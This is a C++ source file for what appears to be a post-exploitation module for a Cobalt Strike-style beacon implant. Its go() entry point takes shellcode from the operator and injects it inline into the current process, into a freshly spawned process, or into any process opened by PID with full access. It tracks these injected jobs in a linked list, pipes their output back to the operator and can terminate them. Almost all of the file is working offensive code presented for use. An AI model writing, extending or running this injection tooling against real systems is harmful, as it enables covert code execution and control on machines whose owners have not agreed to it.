#include <kit/kit_process_creation.cc>
#include <kit/kit_spawn_inject.cc>
#include <kit/kit_explicit_inject.cc>

#define POSTEX_METHOD_INLINE 0x20
#define POSTEX_METHOD_FORK   0x30

#define POSTEX_FORK_EXPLICIT 0x20
#define POSTEX_FORK_SPAWN    0x30

#define POSTEX_OBJECT_HANDLE (PCCH)0xA7F3C9D14E2B8F6A

#define POSTEX_MAX_FAILURE_COUNT 3

struct _POSTEX_OBJECT {
    struct _POSTEX_OBJECT* next;
    struct _POSTEX_OBJECT* previous;

    ULONG  id;
    HANDLE pipe_read;
    HANDLE pipe_write;
    HANDLE thread_handle;
    HANDLE process_handle;
    ULONG  method;   
    INT8   failure_count;
    BOOL   completed;
};
typedef struct _POSTEX_OBJECT POSTEX_OBJECT, *PPOSTEX_OBJECT;


struct _POSTEX_LIST {
    PPOSTEX_OBJECT   head;
    PPOSTEX_OBJECT   tail;
    ULONG            count;
    ULONG            next_id;
    CRITICAL_SECTION lock;  
};
typedef struct _POSTEX_LIST POSTEX_LIST, *PPOSTEX_LIST;

/**
 * @brief Initialize the postex object list
 * @return Pointer to initialized list, NULL on failure
 */
auto PostexListInit(
    void
) -> PPOSTEX_LIST {
    PPOSTEX_LIST list = (PPOSTEX_LIST)malloc(sizeof(POSTEX_LIST));
    if ( ! list ) {
        return nullptr;
    }

    list->head    = nullptr;
    list->tail    = nullptr;
    list->count   = 0;
    list->next_id = 1;

    InitializeCriticalSection( &list->lock );

    return list;
}

/**
 * @brief Get or create the global postex list
 * @return Pointer to the global list
 */
auto PostexListGetGlobal(
    void
) -> PPOSTEX_LIST {
    PPOSTEX_LIST list = (PPOSTEX_LIST)BeaconGetValue( POSTEX_OBJECT_HANDLE );
    
    if ( ! list ) {
        list = PostexListInit();
        if ( list ) {
            BeaconAddValue( POSTEX_OBJECT_HANDLE, list );
        }
    }
    
    return list;
}

/**
 * @brief Create a new postex object
 * @param method Execution method (INLINE/FORK)
 * @return Pointer to new object, NULL on failure
 */
auto PostexObjectCreate(
    _In_ ULONG method
) -> PPOSTEX_OBJECT {
    PPOSTEX_OBJECT obj = (PPOSTEX_OBJECT)malloc( sizeof(POSTEX_OBJECT) );
    if ( ! obj ) {
        return nullptr;
    }

    memset( obj, 0, sizeof(POSTEX_OBJECT) );
    
    obj->next           = nullptr;
    obj->previous       = nullptr;
    obj->id             = 0; 
    obj->pipe_read      = nullptr;
    obj->pipe_write     = nullptr;
    obj->thread_handle  = nullptr;
    obj->process_handle = nullptr;
    obj->method         = method;
    obj->failure_count  = 0;
    obj->completed      = FALSE;

    return obj;
}

/**
 * @brief Append object to the end of the list
 * @param list Target list
 * @param obj Object to append
 * @return TRUE on success
 */
auto PostexListAppend(
    _Inout_ PPOSTEX_LIST   list,
    _Inout_ PPOSTEX_OBJECT obj
) -> BOOL {
    if ( ! list || ! obj ) {
        return FALSE;
    }

    EnterCriticalSection( &list->lock );

    obj->id       = list->next_id++;
    obj->next     = nullptr;
    obj->previous = list->tail;

    if (list->tail) {
        // List not empty - append to tail
        list->tail->next = obj;
        list->tail       = obj;
    } else {
        // List is empty - first element
        list->head = obj;
        list->tail = obj;
    }

    list->count++;

    LeaveCriticalSection( &list->lock );

    return TRUE;
}

/**
 * @brief Prepend object to the beginning of the list
 * @param list Target list
 * @param obj Object to prepend
 * @return TRUE on success
 */
auto PostexListPrepend(
    _Inout_ PPOSTEX_LIST   list,
    _Inout_ PPOSTEX_OBJECT obj
) -> BOOL {
    if (!list || !obj) {
        return FALSE;
    }

    EnterCriticalSection( &list->lock );

    obj->id       = list->next_id++;
    obj->previous = nullptr;
    obj->next     = list->head;

    if (list->head) {
        // List not empty - prepend to head
        list->head->previous = obj;
        list->head           = obj;
    } else {
        // List is empty - first element
        list->head = obj;
        list->tail = obj;
    }

    list->count++;

    LeaveCriticalSection( &list->lock );

    return TRUE;
}

/**
 * @brief Remove object from the list (does not free)
 * @param list Target list
 * @param obj Object to remove
 * @return TRUE on success
 */
auto PostexListRemove(
    _Inout_ PPOSTEX_LIST   list,
    _Inout_ PPOSTEX_OBJECT obj
) -> BOOL {
    if ( ! list || ! obj ) {
        return FALSE;
    }

    EnterCriticalSection( &list->lock );

    // Update previous node's next pointer
    if ( obj->previous ) {
        obj->previous->next = obj->next;
    } else {
        // obj is head
        list->head = obj->next;
    }

    // Update next node's previous pointer
    if ( obj->next ) {
        obj->next->previous = obj->previous;
    } else {
        // obj is tail
        list->tail = obj->previous;
    }

    // Clear pointers
    obj->next     = nullptr;
    obj->previous = nullptr;

    list->count--;

    LeaveCriticalSection( &list->lock );

    return TRUE;
}

/**
 * @brief Close handles and free object resources
 * @param obj Object to cleanup
 */
auto PostexObjectCleanup(
    _Inout_ PPOSTEX_OBJECT obj
) -> void {
    if ( ! obj ) {
        return;
    }

    if ( obj->pipe_read ) {
        CloseHandle(obj->pipe_read);
        obj->pipe_read = nullptr;
    }

    if ( obj->pipe_write ) {
        CloseHandle( obj->pipe_write );
        obj->pipe_write = nullptr;
    }

    if ( obj->thread_handle ) {
        CloseHandle( obj->thread_handle );
        obj->thread_handle = nullptr;
    }

    if ( obj->process_handle ) {
        CloseHandle( obj->process_handle );
        obj->process_handle = nullptr;
    }
}

/**
 * @brief Remove object from list, cleanup, and free
 * @param list Target list
 * @param obj Object to destroy
 */
auto PostexObjectDestroy(
    _Inout_ PPOSTEX_LIST   list,
    _Inout_ PPOSTEX_OBJECT obj
) -> void {
    if ( ! obj ) {
        return;
    }

    if ( list ) {
        PostexListRemove( list, obj );
    }

    PostexObjectCleanup( obj );
    free( obj );
}

/**
 * @brief Find object by ID
 * @param list Target list
 * @param id Object ID to find
 * @return Pointer to object, NULL if not found
 */
auto PostexListFindById(
    _In_ PPOSTEX_LIST list,
    _In_ ULONG        id
) -> PPOSTEX_OBJECT {
    if ( ! list ) {
        return nullptr;
    }

    EnterCriticalSection( &list->lock );

    PPOSTEX_OBJECT current = list->head;
    while ( current ) {
        if ( current->id == id ) {
            LeaveCriticalSection( &list->lock );
            return current;
        }
        current = current->next;
    }

    LeaveCriticalSection( &list->lock );
    return nullptr;
}

/**
 * @brief Find object by thread handle
 * @param list Target list
 * @param thread_handle Thread handle to find
 * @return Pointer to object, NULL if not found
 */
auto PostexListFindByThread(
    _In_ PPOSTEX_LIST list,
    _In_ HANDLE       thread_handle
) -> PPOSTEX_OBJECT {
    if ( ! list || ! thread_handle ) {
        return nullptr;
    }

    EnterCriticalSection( &list->lock );

    PPOSTEX_OBJECT current = list->head;
    while ( current ) {
        if ( current->thread_handle == thread_handle ) {
            LeaveCriticalSection( &list->lock );
            return current;
        }
        current = current->next;
    }

    LeaveCriticalSection(&list->lock);
    return nullptr;
}

/**
 * @brief Iterate over all objects and execute callback
 * @param list Target list
 * @param callback Function to call for each object
 * @param context User context passed to callback
 * @return Number of objects processed
 */
typedef BOOL (*POSTEX_ITERATE_CALLBACK)(PPOSTEX_OBJECT obj, PVOID context);

auto PostexListIterate(
    _In_     PPOSTEX_LIST             list,
    _In_     POSTEX_ITERATE_CALLBACK  callback,
    _In_opt_ PVOID                    context
) -> ULONG {
    if ( ! list || ! callback ) {
        return 0;
    }

    EnterCriticalSection( &list->lock );

    ULONG processed = 0;
    PPOSTEX_OBJECT current = list->head;
    PPOSTEX_OBJECT next    = nullptr;

    while ( current ) {
        // Save next before callback (in case callback removes current)
        next = current->next;
        
        if ( ! callback( current, context ) ) {
            // Callback returned FALSE - stop iteration
            break;
        }
        
        processed++;
        current = next;
    }

    LeaveCriticalSection( &list->lock );
    return processed;
}

/**
 * @brief Remove and destroy all completed objects
 * @param list Target list
 * @return Number of objects cleaned up
 */
auto PostexListCleanupCompleted(
    _Inout_ PPOSTEX_LIST list
) -> ULONG {
    if ( ! list ) {
        return 0;
    }

    EnterCriticalSection( &list->lock );

    ULONG cleaned = 0;
    PPOSTEX_OBJECT current = list->head;
    PPOSTEX_OBJECT next    = nullptr;

    while ( current ) {
        next = current->next;

        if ( current->completed ) {
            // Remove from list manually (we already hold the lock)
            if (current->previous) {
                current->previous->next = current->next;
            } else {
                list->head = current->next;
            }

            if (current->next) {
                current->next->previous = current->previous;
            } else {
                list->tail = current->previous;
            }

            list->count--;

            // Cleanup and free
            PostexObjectCleanup( current );
            free( current );
            cleaned++;
        }

        current = next;
    }

    LeaveCriticalSection( &list->lock );
    return cleaned;
}

/**
 * @brief Destroy entire list and all objects
 * @param list List to destroy
 */
auto PostexListDestroy(
    _Inout_ PPOSTEX_LIST list
) -> void {
    if (!list) {
        return;
    }

    EnterCriticalSection( &list->lock );

    PPOSTEX_OBJECT current = list->head;
    PPOSTEX_OBJECT next    = nullptr;

    while ( current ) {
        next = current->next;
        PostexObjectCleanup( current );
        free( current );
        current = next;
    }

    list->head  = nullptr;
    list->tail  = nullptr;
    list->count = 0;

    LeaveCriticalSection(  &list->lock );
    DeleteCriticalSection( &list->lock );

    free( list );
}

/**
 * @brief Get count of objects in list
 * @param list Target list
 * @return Number of objects
 */
auto PostexListCount(
    _In_ PPOSTEX_LIST list
) -> ULONG {
    if ( ! list ) {
        return 0;
    }

    EnterCriticalSection( &list->lock );

    ULONG count = list->count;

    LeaveCriticalSection( &list->lock );

    return count;
}

/**
 * @brief Check if list is empty
 * @param list Target list
 * @return TRUE if empty
 */
auto PostexListIsEmpty(
    _In_ PPOSTEX_LIST list
) -> BOOL {
    return PostexListCount( list ) == 0;
}

#define POSTEX_LIST_FOREACH(list, obj) \
    for (PPOSTEX_OBJECT obj = (list)->head; obj != nullptr; obj = obj->next)

#define POSTEX_LIST_FOREACH_SAFE(list, obj, tmp) \
    for (PPOSTEX_OBJECT obj = (list)->head, tmp = obj ? obj->next : nullptr; \
         obj != nullptr; \
         obj = tmp, tmp = obj ? obj->next : nullptr)

auto postex_inline_handler(
    _In_    PBYTE          shellcode_buff,
    _In_    INT32          shellcode_size,
    _Inout_ PPOSTEX_OBJECT postex_object
) -> BOOL {
    SECURITY_ATTRIBUTES security_attr = { 
        .nLength              = sizeof(SECURITY_ATTRIBUTES), 
        .lpSecurityDescriptor = nullptr, 
        .bInheritHandle       = TRUE 
    };

    HANDLE backup_stdout = nullptr;
    BOOL   success       = FALSE;

    // Create pipe for output capture
    if ( ! CreatePipe( &postex_object->pipe_read, &postex_object->pipe_write, &security_attr, PIPE_BUFFER_DEFAULT_LEN ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Failed to create pipe: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return FALSE;
    }

    // Redirect stdout to our pipe
    backup_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, postex_object->pipe_write);

    // Execute shellcode inline
    success = ExplicitInjection( (INT64)nt_current_process(), shellcode_buff, shellcode_size, nullptr );
    
    // Restore stdout
    SetStdHandle(STD_OUTPUT_HANDLE, backup_stdout);

    if (!success) {
        BeaconPrintfW(CALLBACK_ERROR, L"Inline injection failed");
        return FALSE;
    }

    // Close write end - we only read from now on
    CloseHandle(postex_object->pipe_write);
    postex_object->pipe_write = nullptr;

    return TRUE;
}

auto postex_fork_spawn_handler(
    _In_    PBYTE          shellcode_buff,
    _In_    INT32          shellcode_size,
    _Inout_ PPOSTEX_OBJECT postex_object
) -> BOOL {
    BOOL success = FALSE;

    PS_CREATE_ARGS create_args = {};

    // Use SpawnInject to create new process and inject
    success = SpawnInjection(
        shellcode_buff, shellcode_size, nullptr, &create_args
    );

    if ( ! success ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Fork spawn injection failed" );
        return FALSE;
    }

    return TRUE;
}

auto postex_fork_explicit_handler(
    _In_    ULONG          target_pid,
    _In_    PBYTE          shellcode_buff,
    _In_    INT32          shellcode_size,
    _Inout_ PPOSTEX_OBJECT postex_object
) -> BOOL {
    BOOL   success        = FALSE;
    HANDLE process_handle = nullptr;

    // Open target process
    process_handle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, target_pid );
    if ( ! process_handle ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Failed to open process %d: (%d) %s", target_pid, GetLastError(), fmt_error( GetLastError() ) );
        return FALSE;
    }

    postex_object->process_handle = process_handle;

    // Inject into existing process
    success = ExplicitInjection(
        (INT64)process_handle, shellcode_buff, shellcode_size, nullptr
    );

    if ( ! success ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Fork explicit injection failed" );
        return FALSE;
    }

    return TRUE;
}

auto postex_fork_handler(
    _In_    ULONG          fork_category,
    _In_    ULONG          explicit_pid,
    _In_    PBYTE          shellcode_buff,
    _In_    INT32          shellcode_size,
    _Inout_ PPOSTEX_OBJECT postex_object
) -> BOOL {
    switch (fork_category) {
        case POSTEX_FORK_SPAWN:
            return postex_fork_spawn_handler( shellcode_buff, shellcode_size, postex_object );

        case POSTEX_FORK_EXPLICIT:
            return postex_fork_explicit_handler( explicit_pid, shellcode_buff, shellcode_size, postex_object );

        default:
            BeaconPrintfW( CALLBACK_ERROR, L"Unknown fork category: %X", fork_category );
            return FALSE;
    }
}

// =============================================================================
// Output Collection
// =============================================================================

auto postex_collect_output(
    _Inout_ PPOSTEX_OBJECT postex_object
) -> BOOL {
    if ( ! postex_object || ! postex_object->pipe_read ) {
        return FALSE;
    }

    ULONG bytes_available = 0;
    ULONG bytes_left      = 0;

    // Check if data available
    if ( ! PeekNamedPipe( postex_object->pipe_read, nullptr, 0, nullptr, &bytes_available, &bytes_left ) ) {
        postex_object->failure_count++;

        if ( postex_object->failure_count >= POSTEX_MAX_FAILURE_COUNT ) {
            postex_object->completed = TRUE;
            return FALSE;
        }

        return TRUE;  // Try again later
    }

    if (bytes_available == 0) {
        // No data yet - check if thread is still running
        if ( postex_object->thread_handle ) {
            DWORD exit_code = 0;
            if ( GetExitCodeThread( postex_object->thread_handle, &exit_code ) ) {
                if ( exit_code != STILL_ACTIVE ) {
                    postex_object->completed = TRUE;
                }
            }
        }
        return TRUE;
    }

    // Allocate buffer and read
    PBYTE output_buffer = (PBYTE)malloc(bytes_available);
    if (!output_buffer) {
        BeaconPrintfW(CALLBACK_ERROR, L"Failed to allocate output buffer");
        return FALSE;
    }

    ULONG bytes_read = 0;
    if ( ReadFile( postex_object->pipe_read, output_buffer, bytes_available, &bytes_read, nullptr ) ) {
        if ( bytes_read > 0 ) {
            BeaconPkgBytes( output_buffer, bytes_read );
        }
    }

    free( output_buffer );
    postex_object->failure_count = 0;  // Reset on successful read

    return TRUE;
}

auto postex_poll_callback(
    _In_ PPOSTEX_OBJECT obj,
    _In_ PVOID          context
) -> BOOL {
    UNREFERENCED_PARAMETER( context );

    if ( obj->completed ) {
        return TRUE;  // Skip completed, will be cleaned up
    }

    postex_collect_output( obj );
    return TRUE;  // Continue iteration
}

/**
 * @brief Poll all active postex objects for output
 * @return Number of active objects remaining
 */
auto postex_poll_all(
    void
) -> ULONG {
    PPOSTEX_LIST list = PostexListGetGlobal();
    if ( ! list ) {
        return 0;
    }

    // Collect output from all objects
    PostexListIterate( list, postex_poll_callback, nullptr );

    // Cleanup completed objects
    PostexListCleanupCompleted( list );

    return PostexListCount( list );
}

/**
 * @brief List all active postex objects
 */
auto postex_list_active(
    void
) -> void {
    PPOSTEX_LIST list = PostexListGetGlobal();
    if ( ! list || PostexListIsEmpty( list ) ) {
        BeaconPrintfW(CALLBACK_OUTPUT, L"No active postex objects");
        return;
    }

    BeaconPrintfW(CALLBACK_OUTPUT, L"Active Postex Objects (%d):", list->count);
    BeaconPrintfW(CALLBACK_OUTPUT, L"%-6s %-10s %-10s %-8s %-10s", L"ID", L"Method", L"Thread", L"Failures", L"Status");
    BeaconPrintfW(CALLBACK_OUTPUT, L"------ ---------- ---------- -------- ----------");

    POSTEX_LIST_FOREACH(list, obj) {
        const wchar_t* method = (obj->method == POSTEX_METHOD_INLINE) ? L"INLINE" : L"FORK";
        const wchar_t* status = obj->completed ? L"COMPLETED" : L"RUNNING";

        BeaconPrintfW(CALLBACK_OUTPUT, L"%-6d %-10s 0x%08X %-8d %-10s",
            obj->id,
            method,
            (ULONG_PTR)obj->thread_handle,
            obj->failure_count,
            status
        );
    }
}

/**
 * @brief Kill a specific postex object by ID
 * @param id Object ID to kill
 * @return TRUE if found and killed
 */
auto postex_kill_by_id(
    _In_ ULONG id
) -> BOOL {
    PPOSTEX_LIST list = PostexListGetGlobal();
    if ( ! list ) {
        return FALSE;
    }

    PPOSTEX_OBJECT obj = PostexListFindById( list, id );
    if ( ! obj ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Postex object %d not found", id );
        return FALSE;
    }

    // Terminate thread if running
    if ( obj->thread_handle ) {
        TerminateThread( obj->thread_handle, 0 );
    }

    // Terminate process if fork
    if ( obj->process_handle ) {
        TerminateProcess( obj->process_handle, 0 );
    }

    PostexObjectDestroy( list, obj );
    BeaconPrintfW( CALLBACK_OUTPUT, L"Postex object %d terminated", id );

    return TRUE;
}

/**
 * @brief Kill all active postex objects
 * @return Number of objects killed
 */
auto postex_kill_all(
    void
) -> ULONG {
    PPOSTEX_LIST list = PostexListGetGlobal();
    if ( ! list ) {
        return 0;
    }

    ULONG count = list->count;

    // Terminate all threads/processes first
    POSTEX_LIST_FOREACH(list, obj) {
        if ( obj->thread_handle ) {
            TerminateThread( obj->thread_handle, 0 );
        }
        if ( obj->process_handle ) {
            TerminateProcess( obj->process_handle, 0 );
        }
    }

    // Destroy the entire list
    PostexListDestroy(list);
    BeaconRemoveValue(POSTEX_OBJECT_HANDLE);

    BeaconPrintfW(CALLBACK_OUTPUT, L"Terminated %d postex objects", count);
    return count;
}

extern "C" auto go(char* args, int argc) -> void {
    datap data_psr = { 0 };

    BeaconDataParse( &data_psr, args, argc );

    ULONG postex_method = BeaconDataInt( &data_psr );
    ULONG fork_category = BeaconDataInt( &data_psr );
    ULONG explicit_pid  = BeaconDataInt( &data_psr );

    INT32 shellcode_size = 0;
    PBYTE shellcode_buff = (PBYTE)BeaconDataExtract( &data_psr, &shellcode_size );

    // Get or create global list
    PPOSTEX_LIST list = PostexListGetGlobal();
    if ( ! list ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Failed to initialize postex list" );
        return;
    }

    // Create new postex object
    PPOSTEX_OBJECT postex_object = PostexObjectCreate( postex_method );
    if ( ! postex_object ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Failed to allocate postex object: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    BOOL success = FALSE;

    switch ( postex_method ) {
        case POSTEX_METHOD_INLINE: {
            success = postex_inline_handler(shellcode_buff, shellcode_size, postex_object);
            break;
        }
        case POSTEX_METHOD_FORK: {
            success = postex_fork_handler(fork_category, explicit_pid, shellcode_buff, shellcode_size, postex_object);
            break;
        }
        default:
            BeaconPrintfW( CALLBACK_ERROR, L"Unknown postex method: %X", postex_method );
    }

    if (success) {
        // Add to list for tracking
        PostexListAppend( list, postex_object );
        BeaconPrintfW( CALLBACK_OUTPUT, L"Postex object created with ID: %d", postex_object->id );
    } else {
        // Cleanup on failure
        PostexObjectCleanup( postex_object ); 
        free( postex_object );
    }
}